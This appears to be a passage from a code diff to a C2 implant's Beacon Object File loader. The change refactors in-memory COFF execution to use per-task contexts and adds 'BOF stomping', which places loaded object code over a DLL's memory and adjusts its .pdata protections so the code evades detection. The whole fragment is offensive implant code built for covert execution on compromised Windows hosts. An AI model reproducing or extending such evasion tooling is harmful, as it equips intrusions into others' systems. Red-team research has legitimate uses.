             DWORD tmp = 0;
-            ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, oldProt, &tmp);
+            ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize, oldProt, &tmp);
         }
-        g_BofStomp.pdataStomped = FALSE;
+        stompCtx->pdataStomped = FALSE;
     }
-#endif
 
-RET:
-#ifdef _WIN64
     if (rfEntries)
         MemFreeLocal((LPVOID*)&rfEntries, rfEntriesSize);
 #endif
@@ -560,17 +568,25 @@ RET:
         BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
 }
 
-Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFile, unsigned int cofFileSize, unsigned char* args, int argsSize)
+Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFile,
+                      unsigned int cofFileSize, unsigned char* args, int argsSize)
 {
-    COF_HEADER* pHeader      = NULL;
-    COF_SYMBOL* pSymbolTable = NULL;
-    PCHAR       entryFuncName = NULL;
-    LPVOID      mapFunctions  = NULL;
-    BOOL        result        = FALSE;
-    PCHAR       mapSections[MAX_SECTIONS] = { 0 };
+    COF_HEADER*  pHeader       = NULL;
+    COF_SYMBOL*  pSymbolTable  = NULL;
+    PCHAR        entryFuncName = NULL;
+    LPVOID       mapFunctions  = NULL;
+    BOOL         result        = FALSE;
+    PCHAR        mapSections[MAX_SECTIONS] = { 0 };
+    BOF_STOMP_CTX* stompCtx   = NULL;
 
-    InitBofOutputData();
-    bofTaskId = taskId;
+    AsyncBofContext syncCtx;
+    memset(&syncCtx, 0, sizeof(syncCtx));
+    syncCtx.taskId = taskId;
+    syncCtx.state  = ASYNC_BOF_STATE_RUNNING;
+    ApiWin->InitializeCriticalSection(&syncCtx.outputLock);
+    syncCtx.outputBuffer = new Packer();
+
+    tls_CurrentBofContext = &syncCtx;
 
     if (!coffFile || !targetFuncName)
         goto RET;
@@ -578,13 +594,16 @@ Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFil
     pHeader      = (COF_HEADER*)coffFile;
     pSymbolTable = (COF_SYMBOL*)(coffFile + pHeader->PointerToSymbolTable);
 
+    if (isBofStompEnabled())
+        stompCtx = BofStompCreate(getBofStompDll(), getBofStompMethod());
+
     entryFuncName = PrepareEntryName(targetFuncName);
     if (!entryFuncName) {
         BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
         goto RET;
     }
 
-    result = AllocateSections(coffFile, pHeader, mapSections, &mapFunctions);
+    result = AllocateSections(coffFile, pHeader, mapSections, &mapFunctions, stompCtx);
     if (!result) {
         BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
         goto RET;
@@ -595,15 +614,22 @@ Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFil
         goto RET;
     }
 
-    result = ProcessRelocations(coffFile, pHeader, mapSections, pSymbolTable, (LPVOID*)mapFunctions);
+    result = ProcessRelocations(coffFile, pHeader, mapSections, pSymbolTable,
+                                (LPVOID*)mapFunctions);
     if (!result)
         goto RET;
 
-    ExecuteProc(entryFuncName, args, argsSize, pSymbolTable, pHeader, mapSections);
+    ExecuteProc(entryFuncName, args, argsSize, pSymbolTable, pHeader, mapSections, stompCtx);
 
 RET:
     FreeFunctionName(entryFuncName);
-    CleanupSections(mapSections, MAX_SECTIONS, mapFunctions);
-    bofTaskId = 0;
-    return bofOutputPacker;
+    CleanupSections(mapSections, MAX_SECTIONS, mapFunctions, stompCtx);
+
+    tls_CurrentBofContext = NULL;
+
+    Packer* outPacker = syncCtx.outputBuffer;
+    syncCtx.outputBuffer = NULL;
+    ApiWin->DeleteCriticalSection(&syncCtx.outputLock);
+
+    return outPacker;
 }
